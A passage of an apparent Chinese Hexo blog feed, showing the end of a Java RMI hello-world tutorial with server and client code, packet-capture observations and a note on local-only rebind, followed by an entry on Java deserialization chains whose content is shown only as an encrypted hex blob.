title="RMIServer"></a>RMIServer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//服务端ip</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String RMIHost = <span class="string">&quot;192.168.47.128&quot;</span>;</span><br><span class="line">    <span class="comment">//服务端端口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> RMIPort = <span class="number">1099</span>;</span><br><span class="line">    <span class="comment">//服务端名称</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String RMIName = <span class="string">&quot;rmi://&quot;</span> + RMIHost + <span class="string">&quot;:&quot;</span> + RMIPort + <span class="string">&quot;/HelloWorld&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException </span>&#123;</span><br><span class="line">        <span class="comment">//注册端口</span></span><br><span class="line">        LocateRegistry.createRegistry(RMIPort);</span><br><span class="line">        <span class="comment">//绑定实例对象</span></span><br><span class="line">        Naming.bind(RMIName, <span class="keyword">new</span> RemoteHelloWorld());</span><br><span class="line">        System.out.println(<span class="string">&quot;RMIServer created, ip address:&quot;</span> + RMIName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="RMIClient"><a href="#RMIClient" class="headerlink" title="RMIClient"></a>RMIClient</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, NotBoundException, RemoteException </span>&#123;</span><br><span class="line">        <span class="comment">// 查找远程RMI服务，lookup获取远程对象。</span></span><br><span class="line">        RMIInterface rt = (RMIInterface) Naming.lookup(<span class="string">&quot;rmi://192.168.47.1:1099/HelloWorld&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用远程接口RMIInterface类的HelloWord方法</span></span><br><span class="line">        String result = rt.HelloWorld();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>服务端47.1</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220309152824177.png" alt="image-20220309152824177"></p><p>客户端47.128</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220309154945907.png" alt="image-20220309154945907"></p><p><code>47.128</code>向<code>47.1</code>第一次握手之后，客户端向服务端发送一个<code>Call</code>数据包，服务端回一个<code>ReturnData</code>数据包</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220309160111143.png" alt="image-20220309160111143"></p><p>在<code>ReturnData</code>数据包中，<code>ac ed</code>往后为反序列化内容。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220309160531079.png" alt="image-20220309160531079"></p><p>修改客户端代码<code>rebind()</code> <code>HelloWorld</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, NotBoundException, RemoteException </span>&#123;</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://192.168.47.1:1099/HelloWorld&quot;</span>,<span class="keyword">new</span> RemoteHelloWorld());</span><br><span class="line">        RMIInterface rt = (RMIInterface) Naming.lookup(<span class="string">&quot;rmi://192.168.47.1:1099/HelloWord&quot;</span>);</span><br><span class="line">        String result = rt.HelloWorld();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>报错如下</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220309164618851.png" alt="image-20220309164618851"></p><blockquote><p>只有源地址是<strong>本地</strong>才可调用<code>rebind</code>,<code>bind</code>,<code>unbind</code>。<code>list</code>,<code>lookup</code>可远程调。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化利用链总结</title>
      <link href="/p/e8376cac.html"/>
      <url>/p/e8376cac.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b58254f3522498ac599a0ce08c314706b5b7c628fec3e4f8ee41681f5d8d440c">c157c9744e0298d00173c08a9dbffe0ec94f198c43dd2b95a3c3b526c19ab93036073643875a834e2ee37559fb6b23854ca51750c19baa75ad928847f66de461a12a40954a047c58e331229e475f5b1948e90e56d7b20953d5023e384c1fdef13edf520b7c1ad82f5923bd76419fba8a1c78b04ab791f33454b6f06aea73d87bca6565555804ddd827b30cb08db2d4447cacc86b140d2b7da65ff30d2a097112c4813b32bfa031c8fdd18728bb58dddda19cc48a4af3ba0da4999f249d824eb51867e6d42d8398bd697aa350e1107a29fb04a34f61458ffce31af3cec8aaa981e44a1c6b88ba609c901b50380632c84a48a3c43de5979ac8ec47035baccbc9361d6d3f28636a4ac8d8666c1d9d21f18c4542c982236f6ae8eab2f825c2f7a17b9b13ea20711f6dd7d8e6aedc324df8d311d5bf2a77e4e3068c5fa6835af18deceffaebcfa6232491c669f0a1b17f49a5fac0e64ebf792fa1ca9bd5e56a68187de7c9f20b3017864249b04b12ba9287753c7409333978540ca950b53ea2db1c424e7bc318a607fb835d631044d3c145ed5114f3751ad18f0adcf9a1a213140d3ba20643f3ca6450aab7ea8490f929b7ee2cb4158ac89de70bd635dc7194571d0c805a6d2b4b1e0db5911580ec2eebfae39651a41f1838b599d6b09549d4e08e4a6b9ccd68dbef644db03b5167bb3d20801fbd84d6e70cebcf25e2c156ae1ae45e366f1840b48d27e3fcd95b3c9135a3f61f1a9922e459ce1ac355703ed67821dc4e71edc0f8bfc62a0514d75415a1d915d51017c16682affab3e57efddd9921bd4c35e505e33bb0c73061c71527c64f86e4538e6f9ba4b794f9a49bfc456400dbedf29bdf903e5f0a53d76513af88817c01699030bd8b3f343d8096827f169bd510b42195b86f620f5a33529c34ca110ac803f300545736201344623c6fac07d58c7bb5ac59e0497c11493b7b2d9dac71b9379940456f2b7163cdc5360dc902035dd00e0cbb06463e4775a1fa51c41ede9b34be32dc8135e701e0211aee6d82edf0dbdafb38a2a0ea8603f4848846220d8de69d63a326393819b51eee44f15090f222e16fbcbefb4ae89a223eb66fd08312a27bf018b91b71611ed62fa8286425f2ad22532536a3e37cc99c4e3a7804d451083879ce1689e078e35f3c83ad559352341ff960b6bed4b4fb1c3db8b7e975c80928b3bea644bd75c379909cbb2e7f3962827bfd184a5dd553da8a6af13e90cad4d2f97a8d91a8fef5021c2c86ed0b8965ae2b02e4ef337b275d565ef534e6338209c9eb557bb08b248bf62916c07ac6ca602284624861b826c451a4400460273fa447867376f65264b0403d8618e4666b2466cf8347b7d529a26e85938b4875f5a3a876b6b4652ecbbb7899b7894eba74aa65ed980eb15e472a2954fc6e565b2e16ae5a84d45a4d45137549533d1cd9ea13ab39ba16e37e0a16e3123419b6452d48f2780694e7d04b28c247b6ac117ab19d992a0208f8d6c12b22628e5846d19ef43f279a20140d28b9ff0ed99ad930c828754e9520b5d68bd580a9dddbd85834cb52fbb59d8c33bc1374aa5a17b06300e901f193a7d7bc274d04655984e811a7994335b19ae3f5b853b09eda22fdf16346a10a45a0dd05f4349f85bfe0ae3d45e2c4801038ed4947d7271bae1364b111c74605d065f0eab7677d7f8570c286f8d288cd692964a3abc1ffd0b434f249f1911869afd5d1ab8e3b9f12970aef9cc5048a7fe046977270a602771bf7499e27638ececc2b3f750419921a2f245779cd0b426e7bf71a250e7a03254b8ff46df2bbf9aa941393fb15abd2fb1b614b7a5d2e9a163f38c9d76baaab1f3a3e7c3a5f6c8fd4efc475372a2c595f0fa8f684bc402c6b740be391034608bb92cdaea7c4003e1357971615fcd171f033fa402a64dfcf3087385a725157cbfcd0bc5ccbe4018f5ffda4f775bbdeff75f9404ce5d2da6fb37840e595440f94a6ce93929eda2c9c8b32d53815cf37cc7e3fb59f34f3a3a0c6c3f276187959b818ffaf0b7dfc5948d4e58f93ef8d6aa0bb2a37dcf6020f3bae4b20e5167cf64dc937f2a080b7bda11262996d910ad7746ac5379f7a708523eb2aced4e163396a15f4f438884da39b7230ef5992dc5ef07e0b1e333302dfb2e853d6bf49fe343bf04d1e24dfe8c24a3b93c63c757c67ac84a3e0c4802d239fec727470ab5b019f69b3755e838335e502e0937552ee5cbfa241d41ce9517eb25d38ae7e209cad915b9976cfe2582579c5ce867050fc192862f20a0d7802047d8c4959a1169fd49b87b7e9566f2ca168d4069a0fa85bfb25eeaf21723ca21a0d09f667f2916748f34cac86972a608b7fa0bc86a937e9a1c10c68aac6a136f1fab0e45bd531ef338afae9cb3fab49af00cfb70977604d46bd6805132acba508b4e5c82ed289e7e65ae0db180ad9a0560a5dac8b538f605e8d8f90f7791808f8cfcf81166c2d8bc1a04ff68432027f7450538291ef75e3d86ac42d7fda17d5702d33bf73868e9df0a4bd4bb38e02f05cd4969f0076a2213a0c6eb7626a88cf6d78192d42021cd8baac41e24aed35a32ac32af02331230d4a51d66a814dabce62c8de961cd13d603d8196ac0b1fe72ea0462e641fce413872e2b7468d5180cd7b1fbc9605f0d82f067c57b2480af938ab3d236b37653c711a2b17adcbc9747c2cd1978f24afec86b1715b001afde55f40950653306e4382900e9a97f82694b2b52f1d73cde65487f46daaabe156424a1f1b25f6bb2b542742a0eaf2d05a8164a09b434120ff860ba7e05a33d9ccbdfbf51c6da9414d7f3462eb62f7b0daa753baf0765f0deef1eb943d9ad0e07808f2e5972c5b4a424ca41a080139a4b63dc4efaa3a095706118aab22c215e03d8cbb8b14ec8f7932eb6a039253c1b2a2acf568c4128496587bd99e2b79024892ae0db25f3dc36a74dc9f3d425c09862cb904a3d209b5b18dbadbaf16cd9e64d6a0fc22f5f784bf1b73b9601cb9b740d8a0b32c972e4fb5de1298506492ba66517c08516f8c71b42656509ce80bbfc859be110bf6446310bcb88bc249ae7350c0a98fe81f457de57935533c88287db876d30cf9c0e5c4015f36e7d8f3fffb8ccbc83c4d57c668c7cfad02b8ffab32123a26bceac00a856f2007f9137f452bfa87c315bad355b136c55f093cea595dccd16c735658071082389606a5b2332eeee03b3ddf8e575d11f044fe1d3548d9d2138b8630a1efab792a294bcb9514de6a47c89b192edc3e0da89b35cceab30afcf38630d40a2b97dc90d447b51ce43fd5d2c96f85fd832710e0a3a2d64bedda7b8ac61cbfdd295b505014e827b41e61a01f41fdec263475789d1e9482f4b62325677376774f8cce9a4e16feec7f7fecccbf5291c7ddd1075dee29f5ee6ced2236fb226bf0acb7f87053dc59bd1c7b5e4cf1b94ddb561602a5703f82b0a821b8581f4357eac26834804bb5a79f4ef3fe60e63b78ebb8f5b1307491c484b6c054cbedd5235ee179ff0a076d3fa7c7255da3ac06d8f89135efe8134c59e1c33089733cdd2e9c80dac7e973cc3650af493d79dd22db7aa585942c5ea07bd122710ee93189b2528b9bae87f5d79540bc7f7111e89b91787b4b38730da45d539196dbeaf506c010bcce8b1750752d6c618578e5f752969d7f66db64d4629ac78fcfb9df1776cf08dbf1c5ba27321de64fb936001797bff4e439ab53e433d3dfdb7f79f531faf11df06bc3b4264a6ec1361c1e22c3a91b809db282128155a9eec7c3f4605e7f07bf85464920fc84ddc28a8734e9651bf945e9323ed8f34751ca1ad5275963870b6404a0d1a77badb31ec2a2facc9814b3ca3b5856813949e941efa97be34337f0744fce55f374d8ba84006ba61f844d63e9d52e5b19b5f1438522759ae69b0af78ddc938fede860ca74228fca0125d182848dd1334b1a278c70dd9874af152688e49a62563eca050372a660775ff4a729c4a889fd7e72ae6272baa76d705c03205019be656b7b3644d93fde1ed6b215abbdcceffa49faea3d276aa5dd778651d4607c6f061e39b5c16a32e0983a15d44c37dad37abf7f58df11e2e0dbbc9ccac313c83a94182a6753d8a92210a49a2368ae99c287df067252bc6d8bb412776a3de355116120a6ff2fbc2c4a5b3d67df24f8ead91ef69f377cf987e1dcb31650e1bea7f57aa83ad0e9511f5acd643a1134f06e5fa84ee3d65d54c979c9d80c4597a70d38c4656b50722fdbfc12b0a85d3b46cdcfea24a271790dcfef6ab3ee7ef6058b512d4cfe0b9dda8155a1d9bd53f3b35f4ca8149450f981cdb2a38778f62d92906eada6b96043045068a8855d902e06afbaec92a73eb49010352ced65466b24705497b7e38fdcc1a09a3b65f649aa405c9b395a3e922e526054edb76565aaa8ea34b090c1f6ed07aeba25a1be3b7e10f8710a2ffc1a02e6fb46e0c66adffedab398b8c51e6a89d3629948f55742444f9c797d5cc8d49add288fa047d9cd3d4102082706603ab2d4cff8d2552493c52e1bf733f1fb0b58ef4837b2f738da766255c63a9685f16d2b6023b943ed14e9ef83e847e18add31b8fcdf46478758c17d31362a56df208b376e3ce3a75de89c91a99e62037758a196a2e46ea7d997e74606ed159cf2e1aee943e66aae7590c9944d69783d874cd673337ef8c05f79e6573a01d051137ecab925fd09d54ef29438e8a5b681c5e6625b05dc193e5c13fa921d54adfd2062e7f40d39e40ad5128b5faabddd97bf88c78941fe2deb876bc28af331dda3342b7f211a27ccead35e5fdd70d92af4832892a8ff7ea4829b88a9be6791bb121fc0251129c76395c744b45edc9a74972191018218b0590db8fd7a5428560e52eae135214d4e514f3bbfc315f7ab608688064ed7ba6f17260a7436241beb2b9e652da6339454451806e9c8bd31235791d5eff66b6b73326fd5651885257c4380e43cbd95154c40686fd9cf69cfb03b50210a806c0802124b428726568ce8688adbcb7e25e9e04e038351b4e26ddb2c5888617ab4734a63af044244e3021a19616100306bea02148752562c8081547c7bd86f9c1b8222df4f0b7d42db9aaf0e611b20e21b27f5753cdce2e7d25c7b0d8b8e07e182b5cd11d259ac5bb384c861dbe1084fe630fcf38404d22a8a1a2fc02dd2454ed73a37bd405a14e48d0fd9b16bd37a8460da2ced69336b7033a90ced75ca7b0b040f00b27e71c74a9dbf5c4c8d21d441ead9e014164a40308a3db23e442e12e2da8fde7aea675f60ff06304055deabcdb155c2a594af2759b322cef6037a86b54e546fb2e97e8ced2ad89aec6bdb58cc1c85e26e9724a5c4f6761177d870098774e2786c6202a7f21a43223ce9af0fe129e199efaed792919bb8ff2a9c08950b0f972ded36a22899ddad184b101ccafedea332da4249350f233a981811ad41ae1c87a5bc440f69b5c288b9c65572a904066d22978d1dddc9eb4f0111845644d7e1c41478a5f85c5ff2f45722df6f9a93c192625da1df1887bd5bc5bbf0598874558117234536f36a3ce7f56bfdb39134dfe78cdb955d14c624c6158e8a0f6a5eb45d217c17f2f0005e41b7fea1573799c79e5e33d1a6e59cb84befd62a7cca8eb1e3790dc457b5a7fd3ac4618a1ad53b552b82a1282de45fea091824d77a71633cddc8480ac71e9952498f22ab71085e09e84ce4ba0bf82f38baa95a3c99ba6450e3f934d715bc2ef88bcce53a99e6a3ad4c7bbba4e35b429ccdff1399dbaa266671b4fea6fbbccf4c9f8d1b9de058a5c97034fab4b1318821b9f6f71705a36ad78b4e3c07d7cd0d3ec68eda58aa44d9cb76fa9acac458ff92b7dd1fb7b51e525072f93be7be8a13a7eadca2db7f0ed723bbfab6b3cb20f6cddc1fd9015adaddb2319bccc860897e9cb4a904435b15f4ee15aa6acf56c1ecc45e237cfd9727aabce063494bb4039619b38f4118f6e61240450693fbe2a12d1ac76421636e9f0b9016ea693ef0b0882e7afa8be766cbbde3ec468aab3936fd52998064bd57c56bb0a46a7a12b3aab61f1a74681634f08e90493ec60a98317e97a54d6639ec1d44f44415588db7d86f249a4f1bb77bbb751f44be79749f0e4a0c5753e5719bfbbc0e10ccacff0a5c9b99d81c9a6224b4238b65aefe48ca5c2be1e0e6d36f875fe4b3a9afbcb65cab44d7e88ae20cecab84938ebcc8b6e15704b60800fac5c159596e3cec626a265608f2501b2e0d99dba34a06c93cb47c8eff0484104684ab15f7d6d397119e4f13aced993800cab141428dd24e9e77f94c32b8042f568f15dd05a0e18f1c2c39b0938418cd11a9c570b07df5a7b86b81cc1470c69bb00b02772a685c710c45bf84853bbe9a2361accb230937fbe99559bc34b06943b11a3bb471060f8921ed8919723839aa1fcf2b43e40c63aef5c547b6d74a4c7cdec98d3f2a4ed0bd9d43910250ece2537e3419b23314df162a9c4e405bce5194a4f59fd2e124e9bd92fe71183f9e4f1dd1f256e8116ffadaf2ffb6eb6fff4d1d7133b4a660dd20187b389aa9dd1058c4d5d1d24f99f367d4d63cb57fcfe065bed3e0149c09c93c10a325e21502c6d5e56f15fbb3ba02b3f07aac13e74e515d4a7004d8547010dd565dd7dc1d8b751123b84ea69ad7c352ca2730b8c8e1f331026320deda697cd3c7c7b700f1358f035019a3345736fea9922cd5b584ee0571b9ff9bdfc15fedee6bc5dad28597c7c095f9bb33b1b8afde26b8fdfff2af77c644a87aa982732057bb89f561a1c750d7ebf80a19527675228f8b9a0b1618b9c6e81d4ea82d3506a843a11abde9f6fbdd8cf0cc69c5536d62325184746d1513b136ec289c446d639c219a562dedf69da1396cf511b562f99d1b74d66e8fe7cd0668b8486fe031adb14ac28ba61fd19cc896d3ea8b39994741bb1d0f7c5055aea92a895db0a273a4e0c823438999af2ee34378008f4a3cafbc9c2fb41107f6599408349706decca26dc1ba39a295731d89d85e7ebb2c26a9f805358dc860870519abbeebd1d0e60d093c5c40852c0f3fec72a565d7674526fe3cea9ae66f57478a40c63faa4aa08aefbcb34b174893986016b302d1c4f2e959f98d19b0ca6ddf3d1fbcafe5ee7f7d0490088f02b6b5c4dea17a3394a0f8948d3fb90b6a0f37b29bc4b2f9e0bb12ea98f2c4f88e4eb6605d8e6fdff382a1fd42e82b2f05befd6c56a6b50159108c874e1d340b894a164b6f86eb73a524b5b61a9e9b9a60e6096134a69e49a21741bbf018185ea3571772bf57defac2a2856ca9bccd6ac9024f8ad31ff599207619c593cfe7b31286f6fa462eeb19444b6135f5e4a6701e06eb31a56214956efd30b6deca44937bf30a783b49c1fda9d5e64748cd697ce5bcd32234210839b1783ca3883217cd44840d2d9b0b1e79f693bb13a9e4098eb0bef58f5072bdadfb601e997c3e7e23ea0ec92f16291e2a0a84239b8c65c01d6c781bdfce025d2b346dc55b0c1136ff0607b22efc4a804c77ab1407d6afe074e50704a21082283370c53ecda5ae64f848cad7a6d2c5b51faf43c90db16e9cd1240fe3fb097fa3637cd38a4a4d6cfa15e77ec25179997c1f8e6832090f7bea8798d3fd63da06d79fa3c2931a036c7b2097a7ce627371416b03e5b04cbc8007aaf840c769dc9f8623b9c3f857dd8181b90b1c53b623d2f7ced2031a4accfc70a2484f3ae9e1e16d1c6f38f180143d066fcff1a6c63670aced2ef2ef26ad7f54e6d371525e2aa02ce9974e01db83777d469543d86763e5305e102816930d03c33ea10b2940dc44ce30535225c62f395db427d0fc3a6dad5137ccd65164efab94e0e9eea49b2301ca1aba5a77eb1039f5e2cdbbd4021f70151c9c9f61ab5bd26abf9a5732a603211d40efc0002f422e59afc068a3eb0c5c17eb6df7691e7fefedc350f0d56d6d1fcb6ba17d91d87caa47930ea068abed8a6c7e266d41b1fa1801706bda08ff375bd42c66eea2bb63f5972bff1480f25059e38f7201c4a4a894112246257f51d312d071a459f4a86f8b2c90cc9ec50cc1a02ebee8b902fdec1046ba75bb9f4303856df156d428b7f6256bf06c79c3b1fcc00bf7b8b29262f0b2403d5edda814381c39b1327e451e5a6159592741e0f83d83e3fd4a384d75240fdcf7fd3dbdd38f9688368238a44e54b7224139c1146179280577505bd6ea327bde3d8bf92ba0acccb28fccd0051aafeceea14187e7bc15706499c0e77b37432bb2be7a107156ee6235d2e729d84dc06fa1aaa7148e213e04c6704ee8d3ca2cf81dd15c0a970b2c869212d6cd91e23be3661f03dbac9dd520be595eac5a5299b9294e36181cbd5db78ef7e3a4a96c0b7f99c51b64dd381a3a44313c50e603de31fe3a85e7744d2ff127d87e49e5564c6ed1e6c3bbf1372301a0452b0f8bf534c9900b8c717e9672598d3d6de67277cf3a07234682f134b53b5a7fe092591698de6277a086479764f51b8fed2beeb7cdca38af7c522173ae79f08dc5054e7192027e9ba2d55411c06972f65854c94f962e7c7fd262f834c95934203aa5cae0a0742a72ecc04a3e5266eeba688339a7169778e6fb93e43319e63fd18260ad77927e90e0a0f64da3b323f09127655100dc7c375bc8311d0a52ea8253f595733a9daf62e675cfa56786ff187e748f29203033900974bca8b1cb824cd24e4a08464f10c745d8cc1019e6d6ae2c1b0e96a711838fb85c277b9dea680af31a58f7d27f6c4ec4d899fb2f546f1c92033dde2bc2a9777d4c79c601ad236744336ba43c8c9a68954a0b6d2b892f729a1aa16886ccf34ec19a75426dd81f3cf0f7d2ed042a6a75cf314e0a794d3b1e31084822d5dced53177ae19ded232d5b905feecf71f1b2149e938dd979e26d288f308931cd7c4490f8aa197c343b1ab81816cbf06f82e8c1292d0d4231891c405ce9a7b37e5e8e99759ebaf754c658129e6ae5c14d58675c5331af8253253e1f8de82d9305b034f8472c9a0b1967d6c9cfa6c8c9d1f7f99387326af46a38e0e18c127b12912ef8a4def92a81febf6473f60f336cd671d4204a253585b1ff4cdeace0342b1db2303c9225b2ba392d36b9071195a3e8de553108bcaa545c07121b427913ba3a1a3f3cf1b1f59d9ff18b5facfbf7da5167402611c2673b71cfbd350a5d511321e5ffefb92592a369ad88f38f185d99fe8822abbc8c2d226bb08d04a685a7a6905021aadf59a6be79bcdc6eb2cbd30140a3a5f3196171b6da3fe408aa2fb6e7cb114126bb360735565dd52f46d1e61daadb884e33025aafbe923b74083c98050ca88497d80bf2a19242a8f1c5021b1af382a394bc668ce9db57253ce0f422cb2166adb66c6896e500212b8f8ed88cfbbcef74590fbc646ec160665080d389a44e9b855665bc11c8572507ab1e17771c357cdc2c3e50f5f866bda7faceaf1355c32bc0519783ae228604e1eb95dc68ed68cb1e1a1f4997133aca43ce990923cf714bcf1e20a7bda3ed0b3150bcae5ca6405363ba93023c0654901ed94a877c971d572ecd097b2eeb8fb265a863ba85f5965a80d27607ca0fbd25e67aa4faa14e17bdb0d2e44957d2c7eb5fe80832bdf6d99fb59e447acca4be1673b4b13fed136ea2010a7270b88dd2736477ae045fa56df48146d211857517fc50b8076cb0afa4fc02dd60f357801b262d4b4abbb4147bc250dae8f89ab2d2c7052a05bee1d17321604667d3c989782898c37c61a123a2f178a192c11e484165d88095057a086f35ee935cc776f6cdf84955f0b0b4eacb88de7da9e592366f96a2b9d99572ee288b054dc7fe1c9de44dfc87a543a9aa9d1522c054cfd5384fae9ae98e38a907ea9ad859835fa9b80730b214f9e646f1bd93485097f42bbc62d736033527f43726f5b18d208d7758ac01f6861d5d4e1a3e5621cc3f6b657f5b7bb7a815d619863246b77cd612c8083aa54670021551a6d98130771581187b3945e16a55400e9abd26248d801b3deec50a4927a5ca6516fabbc6759c88d02acc84b543ee44bef66144b43b08642c6a0b8e027ecfb8869cb2a1093d9ee4c10968d375caee30de25e9ad0e4ab0d3d267ffd4900496444a6a07837f8f440b00b49557999f9d5b075367e84098d00d8b9986a3eaa031361757367f6b8e1132184d379dafa4bbf9ecbdb6b2269dd806f1e83f6d949cabb5bc7a23fd19154f6a37e52ba3f5d59b22446070f19fe5d318157b085af5402861a19a5550675e95ef89eee052bfa22583b4eedcc649f8192513e3c93377c46a6ff9375e179341c8d725cda940ea391ad6e918a9d40cf80a74c903bf0cbe395743f06b4ab4eef78db6b6ea9d7f93be93c20e178badd79b079cfc4acedc846d05ed2ae35dd16e6fbb8b68cf7e07b1ef70bd59da490bd5f7c273147e6bf9826d82f56a71afc11971ca4422370d88da8bbc1692a6d323568430954ca5a43f817b1ed8a4476f472ae163da086a9c8a50bda19a9f7064b6d576e397c577c10a7f09ab033bbce1a9087bcf982dbfa835c2989778ad5005a63a6fa8f746576336332bab6829470531b096b73aae088cb75fa51b85d1d91540a2fc7c23b4174da11061b4a4f09af173affaf990b2c8e4a40f6eb2345fe19bdc3da39c01ea473cd7d8a563459475877398d5eb038154d4ae9b29cc85ed6bc98df56f016a98b6fd488bab450d33d982acb649f3418caa00e70bd55bde3406c9adf679961f117b91fbb2faec6c89f4c0f1cfa49b7a62ff36fa9a4b5427bdcddad95a7a4e649aad6e00af4fbe72f870e1fedf30f4ba193e58d98c9af90c3166efe2fc9102361e6d9a44ca3db7f1e1a9596948a3af9e90cc85c75d21c581cec5e935e4ef31ea3773271f8d8a15afa51574ffdfe218345f37c9b6cd6ff3e6983c2a190818bbf96a2aedae22b61fcd249580cf8d9ae56651ba858aad28a55b0b9f5e7afa4a6788ac73d283f46d7de6c08da5ee9020e494b147ffb79f567abde97fe5c8f6b9646d777e980d41ee194cba6dfd1a54584b79f0e71644f1ad771717528f70e64e1860d1a6b368ab449527c73845dc2182e53f7f4101dd886b7dc40ea435d16816a6f582b0e34c3c23006ddd03fdbc13ca7b3f75f11a0cf097a8d10316630090377b0189a6e61daf0b79bfea3fd9b04fe44c27afe2fa9512fcf6595e0e6bd4b8f485b92904aed78698cb607987a85ba6942382204e4ea1f8957df6e39af8f752d4385dc76f84d0494e24760c98f561d9a01227bd0c36596fb9c1e56b1ebd55a3b9d94cb0fd6c611da5da5e77f6f17e82ccdd7a3ca4fb0bff7ffaed62cc26406136eca9f1332150f317499e8ebabc0fafa19a98e501616eee8dbc619a7cda1c810515c8c1f5acb07af320b1ef6308dc74d49e139cd7ba1f6fccb83d7d0e0e073eff8b4edb331e21c2d9c7f3bae856b9fd36f0f6f1e0030e7b11b32000ae982b52152088c9c9fe0a30c9c0aedce31941a6868e2cf5b83b021ec87192d6ba4fd8a5a0735ebf337b10cce8ed9163fe6d844780f4b0f28fc80e27b50d3589487742ed44872192a811675d2d429c08ae013827c00faf49e85f95f01ba9581f9bfdaa599064917ccbbb27963b7c65a72507da51a26eb32ef8e73407e5806818dcb971d4e9016503406f9fd39398d80844dc37af76650cd229ce3888ff58137ce28829e0cb51dc4111f13a2b3fe50366042de19367b6f25fe67df1bb209a2ea21c57c13c85dc1788c08f986f42834204de6e8c0c685a93c14565d2bf0ea4b5c9e43e3a6cd09602eb161d00745b66a4539dfdfe94cdd904b3b3d6a9426bcfe6370b472dbf7ff1d4286afa8620d95f23d5518695ba72ca438a1926df4beec33c3cf8bdc22a665d39b651e2e66cf117068c96d12b12064d1140f5150ba5585ac5c809d6535752d258d4319f7075fccee019fc782489aab30efcd15d2861b065f6cae9d5ef26b9da90f89d5a6d696e33839b4c92565b90d3d977a178eadcd635c2129f170f0ad02f4d81fd4ee1340f064d128fa7e9b3f20dbef787a3e1c5f87a6c733262e17ef774f87b6351bffd0b4db5f852004593c626e2e31a3c8783d01d99f7dbb6c3950ce738112c22829370ee00958b3cc8eb880e7b1332e625d931f4c0cb1c9a2e30db6736378612df0cf0b4a6e8567d79a3ce2cc77501b66868eebfb137c50c34f8bbebf049839ad38752210b1783725f18188866eafdeb3a397c9973a14d3471811527a82dcea29167d64221b1cef136aca4a76c68a144a22ce6ab7fe2a04b6a0f20f9da5d9ce6758a3a3bb02f247619ede0